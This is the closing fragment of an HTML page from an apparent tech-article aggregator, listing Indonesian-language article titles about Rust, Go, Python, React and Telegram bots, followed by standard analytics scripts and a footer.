<li><a href="../id430294/index.html">10 manfaat nyata dari penggunaan Rust</a></li>
<li><a href="../id430296/index.html">Jadikan ide Anda datang dengan aplikasi. Aplikasi tanpa server - petunjuk langkah demi langkah</a></li>
<li><a href="../id430300/index.html">Layanan microser on Go dengan kit Go: Pendahuluan</a></li>
<li><a href="../id430304/index.html">Pos luar biasa di orbit</a></li>
<li><a href="../id430306/index.html">Terowongan pertama Perusahaan Boring dibor oleh Ilona Mask</a></li>
<li><a href="../id430308/index.html">Python internal. Telur paskah</a></li>
<li><a href="../id430312/index.html">Validasi bentuk kompleks React. Bagian 1</a></li>
<li><a href="../id430314/index.html">Bot telegram lain atau implementasi bot kencan</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>